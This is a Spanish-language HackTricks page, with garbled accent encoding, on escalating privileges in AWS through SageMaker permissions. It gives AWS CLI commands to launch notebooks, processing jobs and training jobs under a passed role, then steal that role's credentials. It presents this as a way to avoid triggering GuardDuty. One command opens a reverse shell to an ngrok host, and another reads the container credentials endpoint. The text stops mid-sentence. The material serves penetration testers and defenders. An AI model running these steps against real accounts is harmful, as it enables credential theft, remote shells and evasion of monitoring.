# AWS - Sagemaker Privesc

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## sagemaker

### `iam:PassRole` , `sagemaker:CreateNotebookInstance`, `sagemaker:CreatePresignedNotebookInstanceUrl`

El primer paso en este proceso de ataque es **identificar un rol que conf√≠e en SageMaker para asumirlo** (sagemaker.amazonaws.com). Una vez hecho esto, podemos ejecutar el siguiente comando para crear un nuevo notebook con ese rol adjunto:

```
aws sagemaker create-notebook-instance --notebook-instance-name example \
    --instance-type ml.t2.medium \
    --role-arn arn:aws:iam::ACCOUNT-ID:role/service-role/AmazonSageMaker-ExecutionRole-xxxxxx
```

Si tiene √©xito, recibir√° el **ARN de la nueva instancia de notebook** en la respuesta de AWS. Eso tomar√° **unos minutos** para poner en marcha, pero una vez que lo haya hecho, podemos ejecutar el siguiente comando para obtener una URL pre-firmada para obtener **acceso a la instancia de notebook a trav√©s de nuestro navegador web**. Potencialmente hay otras formas de obtener acceso, pero este es un permiso √∫nico y una sola llamada a la API, por lo que parec√≠a simple.

```bash
aws sagemaker create-presigned-notebook-instance-url \
    --notebook-instance-name <name>
```

Si esta instancia se ha iniciado completamente, esta llamada a la API devolver√° una **URL firmada que podemos visitar** en nuestro navegador para acceder a la instancia. Una vez en la p√°gina de Jupyter en mi navegador, har√© clic en "Open JupyterLab" en la parte superior derecha, que se puede ver en la siguiente captura de pantalla.

![](<../../../.gitbook/assets/image (15) (1).png>)

Desde la siguiente p√°gina, despl√°cese hasta el final en la pesta√±a "Launcher". En la secci√≥n "Other", haga clic en el bot√≥n "Terminal", que se puede ver aqu√≠.

![](<../../../.gitbook/assets/image (27).png>)

Desde la terminal tenemos algunas opciones, una de las cuales ser√≠a simplemente **usar la CLI de AWS**. La otra opci√≥n ser√≠a **contactar el servicio de metadatos de EC2** para obtener las credenciales del rol de IAM directamente y exfiltrarlas.

GuardDuty podr√≠a venir a la mente al leer "exfiltrarlas" anteriormente, sin embargo, en realidad no necesitamos preocuparnos por GuardDuty aqu√≠. El hallazgo relacionado de GuardDuty es ["UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration"](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_unauthorized.html#unauthorized11), que alertar√° si las credenciales de un rol son robadas de una instancia de EC2 y se usan en otro lugar. Afortunadamente para nosotros, esta instancia de EC2 en realidad no vive en nuestra cuenta, sino que es una **instancia de EC2 administrada alojada en una cuenta propiedad de AWS**. Eso significa que **podemos exfiltrar estas credenciales y no preocuparnos por activar** los detectores de GuardDuty de nuestro objetivo.

**Impacto potencial:** Privesc al rol de servicio de sagemaker especificado.

### `sagemaker:CreatePresignedNotebookInstanceUrl`

Similar al ejemplo anterior, si los **cuadernos de Jupyter ya est√°n en ejecuci√≥n** en √©l y puede listarlos con sagemaker:ListNotebookInstances (o descubrirlos de cualquier otra manera). Puede **generar una URL para ellos, acceder a ellos y robar las credenciales como se indica en la t√©cnica anterior**.

```bash
aws sagemaker create-presigned-notebook-instance-url \
    --notebook-instance-name <name>
```

**Impacto potencial:** Privesc al rol de servicio de sagemaker adjunto.

### `sagemaker:CreateProcessingJob,iam:PassRole`

Un atacante con esos permisos puede hacer que **sagemaker ejecute un trabajo de procesamiento** con un rol de sagemaker adjunto. El atacante puede indicar la definici√≥n del contenedor que se ejecutar√° en una **instancia de cuenta ECS administrada por AWS**, y **robar las credenciales del rol de IAM adjunto**.

```bash
# Sub√≠ una imagen de docker de python al ECR
aws sagemaker create-processing-job \
    --processing-job-name privescjob \
    --processing-resources '{"ClusterConfig": {"InstanceCount": 1,"InstanceType": "ml.t3.medium","VolumeSizeInGB": 50}}' \
    --app-specification "{\"ImageUri\":\"<id>.dkr.ecr.eu-west-1.amazonaws.com/python\",\"ContainerEntrypoint\":[\"sh\", \"-c\"],\"ContainerArguments\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/14920 0>&1\\\"\"]}" \
    --role-arn <sagemaker-arn-role>

# En mis pruebas tard√≥ 10 minutos en recibir la shell
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" #Para obtener las credenciales
```

**Impacto potencial:** Privesc al rol de servicio de sagemaker especificado.

### `sagemaker:CreateTrainingJob`, `iam:PassRole`

Un atacante con esos permisos podr√° crear un trabajo de entrenamiento, **ejecutando un contenedor arbitrario** en √©l con un **rol adjunto**. Por lo tanto, el atacante podr√° robar las credenciales del rol.

{% hint style="warning" %}
Este escenario es m√°s dif√≠cil de explotar que el anterior porque neces